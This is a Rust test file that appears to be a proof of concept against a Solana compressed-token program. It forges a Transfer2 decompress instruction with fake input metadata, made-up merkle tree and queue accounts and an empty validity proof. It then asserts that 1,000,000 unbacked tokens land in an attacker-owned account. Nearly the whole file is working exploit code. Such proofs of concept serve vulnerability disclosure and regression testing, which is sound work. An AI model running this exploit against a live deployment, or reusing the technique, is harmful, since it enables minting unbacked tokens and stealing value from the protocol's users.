#![allow(clippy::result_large_err)]
#![allow(clippy::to_string_in_format_args)]
#![allow(clippy::unwrap_or_default)]

use light_compressed_token_sdk::{
    compressed_token::{
        transfer2::{
            account_metas::Transfer2AccountsMetaConfig, create_transfer2_instruction,
            Transfer2Config, Transfer2Inputs,
        },
        CTokenAccount2,
    },
    ctoken::CreateAssociatedTokenAccount,
    ValidityProof,
};
use light_ctoken_types::{
    instructions::transfer2::MultiInputTokenDataWithContext, state::TokenDataVersion,
};
use light_program_test::{LightProgramTest, ProgramTestConfig};
use light_program_test::Rpc; 
use light_sdk::instruction::PackedAccounts;
use light_test_utils::{
    airdrop_lamports,
    spl::{create_mint_helper, mint_spl_tokens},
};
use solana_sdk::{
    instruction::Instruction, pubkey::Pubkey, signature::Keypair, signer::Signer,
    transaction::Transaction,
};

use anchor_spl::token_2022::spl_token_2022::state::Account as SplAccount;
use solana_sdk::program_pack::Pack;
use light_compressed_token_sdk::ctoken::derive_ctoken_ata;

#[tokio::test]
async fn test_transfer2_ctoken_decompress_mints_unbacked_tokens() {
    let mut rpc = LightProgramTest::new(ProgramTestConfig::new(true, None))
        .await
        .unwrap();
    let payer = rpc.get_payer().insecure_clone();
    let attacker = Keypair::new();
    airdrop_lamports(&mut rpc, &attacker.pubkey(), 1_000_000_000)
        .await
        .unwrap();

    // Create an ordinary SPL mint and mint real tokens only into an attacker-owned SPL ATA.
    let mint = create_mint_helper(&mut rpc, &payer).await;
    let attacker_spl_account = Keypair::new();
    light_test_utils::spl::create_token_2022_account(
        &mut rpc,
        &mint,
        &attacker_spl_account,
        &attacker,
        false,
    )
    .await
    .unwrap();
    mint_spl_tokens(
        &mut rpc,
        &mint,
        &attacker_spl_account.pubkey(),
        &payer.pubkey(),
        &payer,
        1,
        false,
    )
    .await
    .unwrap();

    // Create a compressible ctoken ATA for the attacker (starts with 0 balance).
   // 1) Derive the compressible ctoken ATA + bump
   let (ctoken_ata, bump) = derive_ctoken_ata(&attacker.pubkey(), &mint);


// 2) Build the instruction using all required fields
let create_ctoken_ix = CreateAssociatedTokenAccount {
idempotent: false,
bump,
payer: payer.pubkey(),
owner: attacker.pubkey(),
mint,
associated_token_account: ctoken_ata,
compressible: None, // "normal" compressible ctoken ATA
}
.instruction()
.unwrap();

// 3) Send tx
rpc.create_and_send_transaction(&[create_ctoken_ix], &payer.pubkey(), &[&payer])
.await
.unwrap();

// 4) Reuse the same ATA later – no need to re-derive
// let ctoken_ata = ctoken_ata; // optional, or just keep using ctoken_ata directly

    

    // Ensure the ctoken account starts empty.
    let initial_data = rpc.get_account(ctoken_ata).await.unwrap().unwrap();
    let initial_ctoken = SplAccount::unpack(&initial_data.data[..165]).unwrap();
    assert_eq!(initial_ctoken.amount, 0);

    // Build a forged Transfer2 instruction that decompresses directly into the ctoken ATA
    // without providing any valid compressed inputs or proof.
    let exploit_amount = 1_000_000u64;

    // Manually craft fake input metadata to satisfy the instruction encoding.
    let mut packed_accounts = PackedAccounts::default();
    // Mint account (read-only)
    let mint_index = packed_accounts.insert_or_get_read_only(mint);
    // Attacker (acts as both owner and signer for fabricated input)
    let owner_index = packed_accounts.insert_or_get_config(attacker.pubkey(), true, false);
    // Fake merkle tree / queue entries so indices exist
    let tree_index = packed_accounts.insert_or_get(Pubkey::new_unique());
    let queue_index = packed_accounts.insert_or_get(Pubkey::new_unique());
    // Ctoken ATA recipient
    let ctoken_index = packed_accounts.insert_or_get(ctoken_ata);

    let fake_input = MultiInputTokenDataWithContext {
        owner: owner_index as u8,
        amount: exploit_amount,
        has_delegate: false,
        delegate: 0,
        mint: mint_index as u8,
        version: TokenDataVersion::ShaFlat as u8,
        merkle_context: light_compressed_account::compressed_account::PackedMerkleContext {
            merkle_tree_pubkey_index: tree_index as u8,
            queue_pubkey_index: queue_index as u8,
            leaf_index: 0,
            prove_by_index: true,
        },
        root_index: 0,
    };

    // The compression entry uses Decompress mode and targets the attacker ctoken ATA.
    let mut forged_account = CTokenAccount2 {
        inputs: vec![fake_input],
        output: light_ctoken_types::instructions::transfer2::MultiTokenTransferOutputData {
            owner: owner_index as u8,
            amount: 0,
            has_delegate: false,
            delegate: 0,
            mint: mint_index as u8,
            version: TokenDataVersion::ShaFlat as u8,
        },
        compression: Some(
            light_ctoken_types::instructions::transfer2::Compression::decompress_ctoken(
                exploit_amount,
                mint_index as u8,
                ctoken_index as u8,
            ),
        ),
        delegate_is_set: false,
        method_used: false,
    };

    // Clear any outputs so only the forged compression executes.
    forged_account.output.amount = 0;

    let (account_metas, _, _) = packed_accounts.to_account_metas();
    let transfer_inputs = Transfer2Inputs {
        token_accounts: vec![forged_account],
        validity_proof: ValidityProof::default(),
        transfer_config: Transfer2Config::default(),
        meta_config: Transfer2AccountsMetaConfig::new(payer.pubkey(), account_metas),
        in_lamports: None,
        out_lamports: None,
        output_queue: queue_index as u8,
    };

    let exploit_ix = create_transfer2_instruction(transfer_inputs).unwrap();

    let blockhash = rpc.get_latest_blockhash().await.unwrap().0;
    let exploit_tx = Transaction::new_signed_with_payer(
        &[exploit_ix],
        Some(&payer.pubkey()),
        &[&payer, &attacker],
        blockhash,
    );

    rpc.process_transaction(exploit_tx).await.unwrap();

    // The ctoken ATA balance should now reflect the forged amount even though no deposit occurred.
    let final_data = rpc.get_account(ctoken_ata).await.unwrap().unwrap();
    let final_ctoken = SplAccount::unpack(&final_data.data[..165]).unwrap();
    assert_eq!(final_ctoken.amount, exploit_amount);
}
